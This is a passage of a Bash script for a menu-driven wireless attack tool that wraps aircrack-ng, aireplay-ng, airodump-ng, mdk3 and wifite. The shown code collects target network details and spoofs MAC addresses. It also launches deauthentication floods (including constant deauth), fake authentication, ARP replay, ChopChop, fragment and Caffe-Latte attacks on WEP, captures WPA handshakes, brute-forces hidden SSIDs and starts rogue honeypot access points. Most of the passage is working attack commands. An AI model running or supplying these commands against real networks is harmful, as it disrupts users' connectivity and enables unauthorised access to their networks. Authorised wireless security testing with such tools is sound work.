		;;

	esac

	#restartProcesses

	menuMain

}


menuAdvanced(){

	currentTask="menuAdvanced"
	#lastMenuID="menuAdvanced"

	interface="None"

	banner
	bannerStats

	echo ""
	echo "SORRY I GOT LAZY AND NEVER CODED THIS MENU"
	echo "WILL BE AVAILABLE SOOOOOOOOOON!"
	echo ""
	echo ""
	echo "Advanced Menu"
	echo ""
	echo ""
	echo "1) Monitor Mode Options"
	echo ""
	echo "2) Honeypot Mode and Attacks"
	echo ""
	echo ""
	echo ""
	echo ""
	$green
	echo "** TO RETURN TO PREVIOUS PAGE JUST PRESS ENTER **"
	$white
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Select an option and press ENTER:"
	echo ""
	echo ""

	read getAdvancedOptionMain

	hotkeyInput="$getAdvancedOptionMain"

	loadMenuHotkeys "$hotkeyInput"

	case "$getAdvancedOptionMain" in

		"")
		$currentTask
		#menuMain
		#menuAdvanced
		;;

		*)
		$currentTask
		#menuMain
		#menuAdvanced
		;;

	esac

	#restartProcesses

	$currentTask

}


menuExtras(){

	#currentTask="menuExtras"
	#lastMenuID="menuExtras"

	banner
	bannerStats

	echo "1) Backup All Sessions and Capture Files (Full Backup of all saved files to ZIP file)"
	echo "2) Clean Capture Files (Removes all saved .cap, .xor, .ivs, .csv, and .netxml files)"
	echo "3) Clean Session Files (Removes all saved WEP, WPS, WPA, WPA2 *.sessions files)"
	echo ""
	echo "4) Change Active Terminal (Switch between Gnome, Konsole, X-Term, and User Selected)"
	echo ""
	echo "5) Start NetworkManager          6)  Stop NetworkManager"
	echo "7) Enable wpa_supplicant         8)  Disable wpa_supplicant"
	echo "9) Start wpa_cli                 10) Stop wpa_cli"
	echo ""
	echo "11) Open Interface Options Menu"
	echo ""
	echo "12) Hidden SSID Options"
	echo ""
	echo "R) Return To Previous Menu"
	echo ""
	echo ""
	echo "Select an option from above and press ENTER:"
	echo ""

	read getExtras

	hotkeyInput="$getExtras"

	loadMenuHotkeys "$hotkeyInput"

	case "$getExtras" in

		"")
		menuExtras
		;;

		"1")
		backupSessionFiles
		;;

		"2")
		cleanCaptureFiles
		;;

		"3")
		cleanSessionFiles
		;;

		"4")
		menuChangeTerminal
		;;

		"5")
		startNetworkManager
		;;

		"6")
		killNetworkManager
		;;

		"7")
		wpaSupplicantEnable
		;;

		"8")
		wpaSupplicantDisable
		;;

		"9")
		wpa_cli start
		;;

		"10")
		wpa_cli terminate
		;;

		"11")
		menuExtrasInterface
		;;

		"12")
		banner
		bannerStats

		echo "1) Bruteforce Hidden SSID"
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		$cyan
		echo "* Just Press ENTER To Return To Previous Menu *"
		echo ""
		echo ""
		$white
		echo "Select an option from above and press ENTER:"
		echo ""

		read ssidHiddenOption

		case "$ssidHiddenOption" in

			"1")
			bruteForceHiddenSSID
			;;

		esac
		;;

		"r" | "R")
		$lastMenuID
		;;

		*)
		menuExtras
		;;

	esac

	menuExtras

}

menuExtrasInterface(){

	currentTask="menuExtrasInterface"
	#lastMenuID="menuExtrasInterface"

	banner
	bannerStats

	echo ""

	echo "1) Enable Channel Hopping: $interface"
	echo "2) Disable Channel Hopping: $interface"
	echo ""
	echo "3) Bring Up Interface: $interfaceMonitor"
	echo "4) Bring Down Interface: $interfaceMonitor"
	echo ""
	echo "5) Switch Interface To Managed"
	echo "6) Switch Interface To Monitor"
	echo ""
	echo "7) Fix Airmon Conflicting Processes"
	echo ""
	echo "8) Get \"ifconfig\" Output"
	echo "9) Get \"iwconfig\" Output"
	echo ""
	echo "R) Return To Previous Menu"
	echo ""
	echo ""
	echo "Select an option from above and press ENTER:"
	echo ""
	#echo ""

	read getExtrasInterface

	hotkeyInput="$getExtrasInterface"

	loadMenuHotkeys "$hotkeyInput"

	case "$getExtrasInterface" in

		"")
		menuInterface
		;;

		"1")
		enableChannelHopping
		;;

		"2")
		disableChannelHopping
		;;

		"3")
		interfaceUp
		;;

		"4")
		interfaceDown
		;;

		"5")
		interfaceManaged
		;;

		"6")
		interfaceMonitor
		;;

		"7")
		fixAirmonCompat
		;;

		"8")
		showIfConfig=$(ifconfig)
		banner
		bannerStats
		echo ""
		echo "$showIfConfig"
		echo ""
		echo ""	
		echo ""	
		echo "Press ENTER to continue..."	
		echo ""	
		echo ""	
		read pause
		;;

		"9")
		showIwConfig=$(iwconfig)
		banner
		bannerStats
		echo ""
		echo "$showIwConfig"
		echo ""
		echo ""	
		echo ""	
		echo "Press ENTER to continue..."	
		echo ""	
		echo ""	
		read pause
		;;

		"r" | "R")
		#$lastMenuID
		menuExtras
		;;

		*)
		menuExtrasInterface
		;;

	esac

	menuExtrasInterface

}


menuHelp(){

	currentTask="menuHelp"
	#lastMenuID="menuHelp"

	banner
	bannerStats

	echo ""
	echo "*******************************************"
	echo "CURENTLY NOT WORKING!!!"
	echo ""
	echo "PRESS ENTER TO RETURN TO PREVIOUS MENU!"
	echo "*******************************************"
	echo ""
	echo ""
	echo ""
	echo "Welcome to the Help Section!"
	echo ""
	echo ""
	echo ""
	echo "CURRENTLY NOT AVAILABLE!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""

	read getHelp

	hotkeyInput="$getHelp"

	loadMenuHotkeys "$hotkeyInput"

	case "$getHelp" in

		"")
		$lastMenuID
		#menuMain
		#menuHelp
		;;

		*)
		$lastMenuID
		#menuMain
		#menuHelp
		;;

	esac

	$lastMenuID

}


menuChangeTerminal(){

	currentTask="menuChangeTerminal"
	#lastMenuID="menuChangeTerminal"

	banner


	echo ""
	echo "Select a new terminal to use"
	echo ""
	echo ""
	echo "Current Terminal: $terminal"
	echo ""
	echo ""
	echo "1a) Gnome Legacy: $terminalGnomeLegacy"
	echo ""
	echo "1b) Gnome: $terminalGnome"
	echo ""
	echo "2) Konsole: $terminalKonsole"
	echo ""
	echo "3) X-Term: $terminalXterm"
	echo ""
	echo "4) Custom (User Selected)"
	echo ""
	echo "5) Return To Previous Menu"
	echo ""
	echo ""

	read getTerminalType

	hotkeyInput="$getTerminalType"

	loadMenuHotkeys "$hotkeyInput"

	case "$getTerminalType" in

		"")
		menuChangeTerminal
		;;

		"1a")
		terminal="$terminalGnomeLegacy"
		terminalText="GnomeLegacy"
		;;

		"1b")
		terminal="$terminalGnome"
		terminalText="Gnome"
		;;

		"2")
		terminal="$terminalKonsole"
		terminalText="Konsole"
		;;

		"3")
		terminal="$terminalXterm"
		terminalText="Xterm"
		;;

		"4")
		banner
		echo ""
		echo "Input a terminal string with arguments and press ENTER:"
		echo ""
		echo ""
		echo "Example: $terminalGnome"
		echo ""
		echo ""

		read newTerminal

		case "$newTerminal" in

			*)
			terminal="$newTerminal"
			terminalText="Custom"
			;;

		esac

		;;

		"5")
		menuExtras
		;;

		*)
		menuChangeTerminal
		;;

	esac

	menuMain

}


menuHoneyPotMode(){

	currentTask="menuHoneyPotMode"

	initMonitorMode

	banner
	bannerStats

	echo ""
	echo "I Am HoneyPot Mode"
	echo ""
	echo "I Am Also Broken :("
	echo ""
	echo ""
	echo ""
	echo "1) Use Airbase-ng"
	echo ""
	echo "2) Use Wifi-Honey"
	echo ""
	echo "3) Use a Custom Binary"
	echo ""
	echo ""
	echo ""
	echo "Select an option and press ENTER:"
	echo ""
	echo ""

	read getHoneyPotOptionMain

	hotkeyInput="$getHoneyPotOptionMain"

	loadMenuHotkeys "$hotkeyInput"

	case "$getHoneyPotOptionMain" in

		"")
		menuHoneyPotMode
		#$lastMenuID
		#menuMain
		#menuAdvanced
		;;

		"1")
		getBSSID
		$terminal airbase-ng -a $bssid -i $interfaceMonitor -h $macAddressMonitor -v &
		;;

		"2")
		getESSID
		getChannel
		$terminal wifi-honey $essid $channel $interfaceMonitor &
		;;

		"3")
		echo "Custom Binary"
		read pause
		menuHoneyPotMode
		;;

		*)
		menuHoneyPotMode
		#$lastMenuID
		#menuMain
		#menuAdvanced
		;;

	esac

	#restartProcesses

	menuHoneyPotMode
	#$lastMenuID

}


selectFromApList(){
	
	# Get AP Credential Type From 1st Argument
	apListType="$1"

	currentTask="selectFromApList"

	echo "Dumping Found AP Targets From airodump-ng Window...."
	echo ""
	echo ""

	case "$apListType" in

		"essid")
		sleep 15
		cat "$defaultScanOutputXML" | grep "<essid cloaked="
		;;

		"bssid")
		sleep 15
		cat "$defaultScanOutputXML" | grep "<BSSID>"
		;;

		"channel")
		sleep 15
		cat "$defaultScanOutputXML" | grep "<channel>"
		;;

	esac

	echo ""
	echo ""
	$yellow
	echo "Select $apListType from found AP targets above and copy to clipboard (CTRL+SHIFT+C)"
	echo ""
	echo ""
	$white
	echo "You may also follow the instructions below to select a target"
	echo ""
	echo ""

	#read getApTarget

}


############################################################################
#   MENUS: MAIN END   ######################################################
############################################################################





############################################################################
#   MENUS: SESSIONS BEGIN   ################################################
############################################################################


menuSessionSave(){

	# Not needed for this menu
	#currentTask="menuSessionSave"
	#lastMenuID="menuSessionSave"

	banner
	bannerStats

	echo "Session Save Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Save As: $capturePath/$encryptionType/$encryptionType.sessions"
	echo ""
	echo ""
	echo ""
	echo "Press \"1\" and ENTER to save session file now"
	echo ""
	echo ""
	echo "You may also just press ENTER to return to the previous menu...."
	echo ""
	echo ""

	getSession="1"
	#read getSession

	hotkeyInput="$getSession"

	loadMenuHotkeys "$hotkeyInput"

	case "$getSession" in

		"")
		$currentTask
		;;

		"1")
		sessionSave
		;;

		*)
		$currentTask
		;;

	esac

	$currentTask

}


menuSessionLoad(){

	# Not needed for this menu
	#currentTask="menuSessionLoad"
	#lastMenuID="menuSessionLoad"

	banner
	bannerStats

	echo "Session Load Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Current File Loaded: $capturePath/$encryptionType/$encryptionType.sessions"
	echo ""
	echo ""
	echo ""
	echo "Press \"1\" and ENTER to load session file now"
	echo ""
	echo ""
	echo "You may also just press ENTER to return to the previous menu...."
	echo ""
	echo ""

	getSession="1"
	#read getSession

	hotkeyInput="$getSession"

	loadMenuHotkeys "$hotkeyInput"

	case "$getSession" in

		"")
		$currentTask
		;;

		"1")
		sessionLoad
		;;

		*)
		$currentTask
		;;

	esac

	$currentTask

}


############################################################################
#   MENUS: SESSIONS END   ##################################################
############################################################################





############################################################################
#   GET CREDENTIALS BEGIN   ################################################
############################################################################


textGetTargetInfo(){

	currentTask="textGetTargetInfo"

	echo ""
	echo "THERE SHOULD NOW BE A NEW TERMINAL WINDOW OPEN, ONLY SHOWING $encryptionTypeText TARGETS"
	echo ""
	echo "YOU CAN USE THIS AIRODUMP-NG WINDOW TO GATHER ALL NEEDED INFORMATION"
	echo ""
	echo "YOU CAN COPY AND PASTE (CTRL+SHIFT+C) (CTRL+SHIFT+V) TO ENTER TARGET INFO BELOW"
	echo ""
	#echo "YOU MAY NEED TO EXTEND THE WINDOW WIDER TO SEE THE ESSID NAMES"
	echo "YOU MAY PRESS \"T\" AT ANYTIME TO OPEN A TEXT VIEW OF AVAILABLE TARGETS"
	echo ""
	echo ""

	case "$encryptionTypeText" in

		"WPS")
		$green
		echo "WPS TARGETS MAY HAVE \"1.0, 1.0 LAB, DISP, KPAD\" OR ANOTHER VARIANT UNDER \"WPS\" COLUMN"
		echo ""
		echo "ALL TARGETS THAT SUPPORT WPS MAY ALSO HAVE \"OPN\", \"WEP\", \"WPA\", or \"WPA2\" UNDER \"ENC\" COLUMN"
		$white
		echo ""
		echo ""
		;;

		"WEP")
		$green
		echo "WEP TARGETS MAY HAVE \"WEP\" UNDER THE \"ENC\" and \"CIPHER\" COLUMNS"
		#echo "CURRENTLY SET TO ONLY SCAN FOR \"WEP\" TARGETS"
		$white
		echo ""
		echo ""
		;;

		"WPA")
		$green
		echo "WPA TARGETS MAY HAVE \"WPA\" UNDER THE \"ENC\" and \"CCMP\" UNDER \"CIPHER\" COLUMNS"
		$white
		echo ""
		echo ""
		;;

		"WPA2")
		$green
		echo "WPA2 TARGETS MAY HAVE \"WPA2\" UNDER THE \"ENC\" and \"CCMP\" UNDER \"CIPHER\" COLUMNS"
		$white
		echo ""
		echo ""
		;;

	esac

}


getESSID(){

	currentTask="getESSID"

	banner
	bannerStats

	#selectFromApList essid

	textGetTargetInfo

	echo "PASTE or type the Target ESSID Here and press ENTER:"
	echo ""
	echo "Example: NETGEAR"
	echo ""
	echo ""
	
	$cyan
	read getESSIDTemp

	hotkeyInput="$getESSIDTemp"

	loadMenuHotkeys "$hotkeyInput"

	case "$getESSIDTemp" in

		"")
		getESSID
		;;

		"t" | "T")
		cleanTempScanResultsFile "txt"
		openScanTargetsAsText
		getESSID
		;;

		*)
		essid="$getESSIDTemp"
		;;

	esac

	$white
}


getBSSID(){

	currentTask="getBSSID"

	banner
	bannerStats

	#selectFromApList bssid

	textGetTargetInfo

	echo "PASTE or type the Target BSSID Here and press ENTER:"
	echo ""
	echo "Example: 00:11:22:33:44:55"
	echo ""
	echo ""

	$cyan
	read getBSSIDTemp

	hotkeyInput="$getBSSIDTemp"

	loadMenuHotkeys "$hotkeyInput"

	case "$getBSSIDTemp" in

		"")
		getBSSID
		;;

		"t" | "T")
		cleanTempScanResultsFile "txt"
		openScanTargetsAsText
		getBSSID
		;;

		*)
		bssid="$getBSSIDTemp"
		;;

	esac

	$white
}


getChannel(){

	currentTask="getChannel"

	banner
	bannerStats

	#selectFromApList channel

	textGetTargetInfo

	echo "PASTE or type the Target Channel Here and press ENTER:"
	echo ""
	echo "Example: 6"
	echo ""
	echo ""

	$cyan
	read getChannelTemp

	hotkeyInput="$getChannelTemp"

	loadMenuHotkeys "$hotkeyInput"

	case "$getChannelTemp" in

		"")
		getChannel
		;;

		"t" | "T")
		cleanTempScanResultsFile "txt"
		openScanTargetsAsText
		getChannel
		;;

		*)
		channel="$getChannelTemp"
		;;

	esac

	$white
}


############################################################################
#   GET CREDENTIALS END   ##################################################
############################################################################





############################################################################
#   MAC ADDRESS STUFF BEGIN   ##############################################
############################################################################


getMacAddress(){

	currentTask="getMacAddress"

	macAddress=$(ip link show $interface | tail -n 1 |  cut -f 6 -d " ")

}


getMacAddressMonitor(){

	currentTask="getMacAddressMonitor"

	macAddressMonitor=$(ip link show $interfaceMonitor | tail -n 1 |  cut -f 6 -d " ")

	case "$isDebugMode" in
		"1")
		echo "interface: $interfaceMonitor"
		echo "mac: $macAddressMonitor"
		read pause
		;;
	esac

}


setMacAddress(){

	currentTask="setMacAddress"

	ifconfig $interface down
	macchanger -m $getNewMacAdressTemp $interface
	ifconfig $interface up

	spoofStatus="1"

	macAddress="$getNewMacAdressTemp"

}


setMacAddressMonitor(){

	currentTask="setMacAddressMonitor"

	ifconfig $interfaceMonitor down
	macchanger -m $getNewMacAdressTemp $interfaceMonitor
	ifconfig $interfaceMonitor up

	spoofStatus="1"

	macAddressMonitor="$getNewMacAdressTemp"

}


getRandomMacAddress(){

	currentTask="getRandomMacAddress"

	ifconfig $interface down
	macchanger -r $interface
	ifconfig $interface up

	spoofStatus="1"

	getMacAddress

	#macAddress="$getNewMacAdressTemp"

}


getRandomMacAddressMonitor(){

	currentTask="getRandomMacAddressMonitor"

	ifconfig $interfaceMonitor down
	macchanger -r $interfaceMonitor
	ifconfig $interfaceMonitor up

	spoofStatus="1"

	getMacAddressMonitor

	#macAddressMonitor="$getNewMacAdressTemp"

}


spoofMacAddress(){

	currentTask="spoofMacAddress"
	#lastMenuID="spoofMacAddress"

	# Setting resetSpoofStatus Flag for global hotkey compatibility
	resetSpoofStatus="1"

	banner
	bannerStats

	echo ""
	echo "To choose a random MAC Address, press the \"R\" key and press ENTER"
	echo ""
	echo ""
	echo "Enter the New MAC Address and press ENTER:"
	echo ""
	echo "Example: 00:11:22:33:44:55"
	echo ""
	echo ""

	read getNewMacAdressTemp

	hotkeyInput="$getNewMacAdressTemp"

	loadMenuHotkeys "$hotkeyInput"

	case "$getNewMacAdressTemp" in

		"")
		spoofMacAddress
		;;

		"R" | "r")
		getRandomMacAddress
		getRandomMacAddressMonitor
		#$returnTo
		;;

		*)
		setMacAddress
		setMacAddressMonitor
		#$returnTo
		;;

	esac

}


checkSpoofStatus(){

	case "$spoofStatus" in

		"0")
		#blank=""
		initMonitorMode
		;;

	esac

}


############################################################################
#   MAC ADDRESS STUFF END   ################################################
############################################################################





############################################################################
#   MONITOR MODE STUFF BEGIN   #############################################
############################################################################


initMonitorMode(){

	currentTask="initMonitorMode"

	#killProcesses
	stopMonitorMode

	disableChannelHopping
	enableChannelHopping

	getWirelessInterfaces

	banner

	initMon=""

	case "$initMon" in

		"")
		getMacAddress
		setMonitorMode
		getMacAddressMonitor
		#getWirelessInterfaces "refresh"
		;;

		*)
		getMacAddress
		setMonitorMode
		getMacAddressMonitor
		#getWirelessInterfaces
		;;

	esac

}


setMonitorMode(){

	currentTask="setMonitorMode"

	#interfaceMonitor="mon0"
	#echo "$interface"
	#read pause
	$startMonitorMode $interface

}


stopMonitorMode(){

	currentTask="stopMonitorMode"

	killMsg="Killing all active previous monitor mode interfaces...."

	# Older style airmon-ng
	killMonA="mon"

	# Newer 1.2+ style airmon-ng
	killMonB1="wlan"
	killMonB2="mon"

	killCounter="0"

	# I just selected 12 as a number that I feel nobody would have more wifi adapters than
	#killCounterMax="12"

	# Using number of found adapters to determine max
	killCounterMax="$interfacesFound"

	# Initial mon0 or wlan0mon before loop
	case "$killCounter" in

		"0")
		banner
		$white
		echo ""
		echo $killMsg
		$red
		$stopMonitorMode $killMonA$killCounter
		$stopMonitorMode $killMonB1$killCounter$killMonB2
		;;

	esac

	while [ $killCounter -le $killCounterMax ]

	do
		banner
		$white
		echo ""
		echo $killMsg
		$red
		$stopMonitorMode $killMonA$killCounter
		$stopMonitorMode $killMonB1$killCounter$killMonB2

		killCounter=$(($killCounter+1))
	done

	banner
	$white

}


############################################################################
#   MONITOR MODE STUFF END   ###############################################
############################################################################





############################################################################
#   ATTACKS: GLOBAL BEGIN   ################################################
############################################################################


autoModeUsePreviousSession(){

	currentTask="autoModeUsePreviousSession"

	sessionCopyNewCaptureFiles

	case "$encryptionType" in

		"wep")
		autoModeUsePreviousSessionWEP
		;;

		"wps")
		autoModeUsePreviousSessionWPS
		;;

		"wpa")
		autoModeUsePreviousSessionWPA
		;;

		"wpa2")
		autoModeUsePreviousSessionWPA2
		;;

	esac

}


autoModeNoPreviousSession(){

	currentTask="autoModeNoPreviousSession"

	case "$encryptionType" in

		"wep")
		autoModeNoPreviousSessionWEP
		;;

		"wps")
		autoModeNoPreviousSessionWPS
		;;

		"wpa")
		autoModeNoPreviousSessionWPA
		;;

		"wpa2")
		autoModeNoPreviousSessionWPA2
		;;

	esac

}


adFileDump(){

	noChannel="$1"
	
	#echo "$noChannel"
	#read pause

	currentTask="adFileDump"

	echo ""
	echo ""

	case "$encryptionType" in

		"wep")

		disableChannelHopping

		case "$noChannel" in

			"0")
			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
			#read pause

			#Working (uses session path)
			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
			;;

			"1")
			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"

			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
			#$terminal airodump-ng --ignore-negative-one -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
			#read pause

			#Working (uses session path)
			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
			;;
		esac
		;;

		"wpa" | "wpa2")

		doSleepMessage "Preparing to Capture WPA Handshake...." "3"

		disableChannelHopping

		case "$noChannel" in

			"0")
			$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid --channel $channel -i $interfaceMonitor &
			;;

			"1")
			$terminal airodump-ng $interfaceMonitor --bssid $bssid --write "dump_$essid"
			#$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &

			#Working (uses session path)
			#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
			;;
		esac
		;;
	esac

	echo ""
	echo ""

}


aircrackDecrypt(){

	currentTask="aircrackDecrypt"

	sessionCopyNewCaptureFiles

	case "$encryptionType" in

		"wep")
		aircrackDecryptWEP
		;;

		"wpa")
		aircrackDecryptWPA
		;;

		"wpa2")
		aircrackDecryptWPA2
		;;

	esac

}


adAPScan(){

	currentTask="adAPScan"

	echo ""
	
	banner

	rm "$defaultScanOutputIVS"
	rm "$defaultScanOutputXML"

	#$terminal airodump-ng --channel $channel -i $interfaceMonitor &
	#$terminal airodump-ng --ignore-negative-one --channel $channel -i $interfaceMonitor &

	$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor -w "$initPath/apScan" --write-interval 10 -o netxml &

	#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor &
	#read pause

	echo ""
	echo ""

}


# Unused Function (20170103)
adAPScanWPS(){

	currentTask="adAPScanWPS"

	echo ""
	echo ""

	$terminal airodump-ng --channel $channel -i $interfaceMonitor --wps &

	#$terminal airodump-ng --channel $channel --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&

	echo ""
	echo ""

}


adAPScanWifiteWPS(){

	currentTask="adAPScanWifiteWPS"

	echo ""
	echo ""

	$terminal $wifiteAttackWPS -c $channel -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanWifiteWEP(){

	currentTask="adAPScanWifiteWEP"

	echo ""
	echo ""

	$terminal $wifiteAttackWEP -c $channel -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanNoChannel(){

	currentTask="adAPScanNoChannel"

	echo ""
	
	banner

	rm "$defaultScanOutputIVS"
	rm "$defaultScanOutputXML"

	#$terminal airodump-ng -i $interfaceMonitor &
	#$terminal airodump-ng --ignore-negative-one -i $interfaceMonitor &

	$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor -w "$initPath/apScan" --write-interval 10 -o netxml &

	#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor &
	#read pause

	echo ""
	echo ""

}


adAPScanNoChannelWPS(){

	currentTask="adAPScanNoChannelWPS"

	echo ""
	
	banner

	rm "$defaultScanOutputIVS"
	rm "$defaultScanOutputXML"

	$terminal airodump-ng -i $interfaceMonitor --wps -w "$initPath/apScan" --write-interval 10 -o netxml &

	#$terminal airodump-ng -i $interfaceMonitor --wps &

	#$terminal airodump-ng --encrypt $encryptionType -i $interfaceMonitor --$encryptionType&

	echo ""
	echo ""

}


adAPScanWifiteWPSNoChannel(){

	currentTask="adAPScanWifiteWPSNoChannel"

	echo ""
	echo ""

	$terminal $wifiteAttackWPS -i $interfaceMonitor &

	echo ""
	echo ""

}


adAPScanWifiteWEPNoChannel(){

	currentTask="adAPScanWifiteWEPNoChannel"

	echo ""
	echo ""

	$terminal $wifiteAttackWEP -i $interfaceMonitor &

	echo ""
	echo ""

}


bruteForceHiddenSSID(){

	currentTask="bruteForceHiddenSSID"

	adAPScanNoChannel

	banner
	echo ""
	$green
	echo "Using Interface: $interfaceMonitor"
	echo ""
	echo ""
	echo ""
	echo ""
	$cyan
	echo "Use the airodump window to find your target"
	echo ""
	echo "Example Hidden: 01:02:03:04:05:06                 <length 21>"
	echo ""
	echo ""
	echo ""
	echo ""
	$white
	echo "Type Target BSSID and Press ENTER:"
	echo ""

	read targetBSSID

	case "$targetBSSID" in

		*)
		banner
		echo ""
		$cyan
		mdk3 $interfaceMonitor p -t $targetBSSID -b -s 300
		echo ""
		echo ""
		;;

	esac
		
	$green
	echo ""
	echo ""
	echo ""
	echo "***************************************"
	echo "Bruteforcing Finished!"
	echo "***************************************"
	echo ""
	echo ""
	echo "Check Above For Possible Hidden SSID Reveals"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER To Continue When Finished...."
	echo ""
	read finishBrute

}


############################################################################
#   ATTACKS: GLOBAL END   ##################################################
############################################################################





############################################################################
#   ATTACKS: WEP BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWEP(){

	currentTask="autoModeNoPreviousSessionWEP"

	adAPScanNoChannel

	doSleepMessage "Setting Up User Input...." "2"

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	doSleepMessage "Killing airodump-ng Sessions...." "2"

	killAirodump
	killWifite

	doSleepMessage "Preparing Client Association...." "2"

	arAssociate
	#sleep 10
	#killAireplay

	doSleepMessage "Preparing airodump-ng Session...." "2"

	adFileDump
	menuAttacksWEP

}


autoModeUsePreviousSessionWEP(){

	currentTask="autoModeUsePreviousSessionWEP"

	sessionWriteLoadPrevious

	doSleepMessage "Preparing Client Association...." "2"

	arAssociate

	doSleepMessage "Preparing airodump-ng Session...." "2"

	adFileDump

	menuAttacksWEP

}


menuAttacksWEP(){

	currentTask="menuAttacksWEP"
	lastMenuID="menuAttacksWEP"

	sessionCopyNewCaptureFiles


	banner
	bannerStats

	echo ""
	echo "Choose an attack to perform and press ENTER (Type \"more\" to see other options):"
	echo ""
	echo ""
	echo "1) De-Auth (De-Authenticate All Stations) (0=Constant)"
	echo "2) Fake Auth (Fake Authentication with AP)"
	echo "3) Interactive Attack (Interactive Frame Selection)"
	echo "4) ARP Replay (Standard ARP Request Replay)"
	echo "5) ChopChop Atack (Decrypt WEP Packets)"
	echo "6) Fragment Attack (Generates a Valid Keystream)"
	echo "7) Caffe-Latte Attack (Query Client for New IV's)"
	echo "8) C-Frag (Fragments Against a Client)"
	echo "9) MigMode (Attacks WPA Migration Mode)"
	echo ""
	echo "R) Re-Associate (Associate with Client)"
	echo "N) Start New Capture (Log to a new CAP file)"
	echo "T) Test (Tests Injection and Quality)"
	echo ""
	echo "C) Run Aircrack (Crack WEP Key) **If decryption fails, press ENTER from aircrack to return here**"
	echo ""

	read getAttackWEP

	hotkeyInput="$getAttackWEP"

	loadMenuHotkeys "$hotkeyInput"

	case "$getAttackWEP" in

		"")
		menuAttacksWEP
		;;

		"C" | "c")
		aircrackDecrypt
		;;

		"R" | "r")
		arAssociate
		;;

		"T" | "t")
		arAttackTest
		;;

		"N" | "n")
		killAirodump
		killAireplay
		adFileDump
		;;

		"0")
		arAttackDeAuthConstant
		;;

		"1")
		arAttackDeAuth
		;;

		"2")
		arAttackFakeAuth
		;;

		"3")
		arAttackInteractive
		;;

		"4")
		arAttackArpReplay
		;;

		"5")
		arAttackChopChop
		;;

		"6")
		arAttackFragment
		;;

		"7")
		arAttackCaffeLatte
		;;

		"8")
		arAttackCfrag
		;;

		"9")
		arAttackMigMode
		;;

		"more")
		banner
		bannerStats

		echo ""
		echo "Choose an option and press ENTER:"
		echo ""
		echo ""
		echo "1) TCP Dump"
		echo ""
		echo "2) Generate ARP Packet"
		echo ""
		echo "3) Forge ARP Request"
		echo ""
		echo "4) Replay Forged ARP Request"
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo "R) Return To Previous Page"
		echo ""
		echo ""
		
		read getMore

		hotkeyInput="$getMore"

		loadMenuHotkeys "$hotkeyInput"

		case "$getMore" in

			"")
			menuAttacksWEP
			;;

			"1")
			# Needs .cap as INPUT
			#tcpDump ""
			tcpDump "$initPath/$bssid-arp.cap"
			;;

			"2")
			generateArpPacket
			;;

			"3")
			# Needs .xor as INPUT
			#forgeArpRequest ""
			getXorFile=$(ls | grep xor | grep $essid)
			forgeArpRequest "$getXorFile" "$initPath/$bssid-arp.cap"
			;;

			"4")
			# Needs .cap as INPUT (Using Default From forgeArpRequest)
			replayArpRequest
			;;

			"R" | "r")
			menuAttacksWEP
			;;

		esac
		;;
		

		*)
		menuAttacksWEP
		;;

	esac

	menuAttacksWEP

}


menuAttacksWEPWifiteAuto(){

	currentTask="menuAttacksWEPWifiteAuto"
	lastMenuID="menuAttacksWEPWifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 5000 &
	$terminal $wifiteAttackWEP -wepsave "$initPath" -wepca 5000 &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


arAssociate(){

	currentTask="arAssociate"

	echo ""
	echo ""

	$terminal aireplay-ng -1 6000 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &

	echo ""
	echo ""

}


arAttackDeAuth(){

	currentTask="arAttackDeAuth"

	retryDeauth="0"

	doSleepMessage "Preparing to De-Authenticate All Connected Stations...." "2"

	$terminal aireplay-ng --deauth 5 -a $bssid $interfaceMonitor &

	doSleepMessage "De-Authenticating All Connected Stations...." "5"

}


arAttackDeAuthConstant(){

	currentTask="arAttackDeAuthConstant"

	retryDeauth="0"

	doSleepMessage "De-Authenticating All Connected Stations...." "2"

	$terminal aireplay-ng --deauth 0 -a $bssid $interfaceMonitor &

}


arAttackFakeAuth(){

	currentTask="arAttackFakeAuth"

	#$terminal aireplay-ng -1 1 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
